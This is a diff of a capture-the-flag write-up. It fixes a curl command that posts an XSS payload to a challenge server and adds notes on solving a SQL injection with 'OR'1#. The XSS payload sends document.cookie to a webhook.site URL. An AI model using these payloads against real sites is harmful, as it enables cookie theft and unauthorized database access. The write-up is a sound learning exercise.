@@ -89,8 +89,22 @@ which led to this :
 * Reference : https://infinitelogins.com/2020/10/13/using-cross-site-scripting-xss-to-steal-cookies/
 commands used
 ```
-curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>
+curl -X POST "http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php" -d "14c4b06b824ec593239362517f538b29=<script>document.write('<img src="https://webhook.site/694ffb57-9ed8-4db2-86ae-5463fea3af0b?c='%2bdocument.cookie%2b'" />');</script>"
 ```
+* robots.x=txt and found 2 interesting result found
+* login.php leads to admin page
+* debug=TRUE leads to debug message as photo
+* we can come up with the hypothesis that SQL query is 
+```
+SELECT * FROM status WHERE filter=filter AND ID>0
+```
+* from the debug message, we realise that query uses "'" single quote
+* 'OR'1-- yields empty field which means that there is a special character filter
+* removing "--" yields 
+* Thus we seem to be very close.
+* It now seem like we need to test for what are the useable characters and what are not.
+* using 'OR'1 and appending special characters to it we came to # and the flag is out.
+* Further investigation and we find out that # actually comments out ID>0 and hence the query will output what is on ID=0  
 
 
 
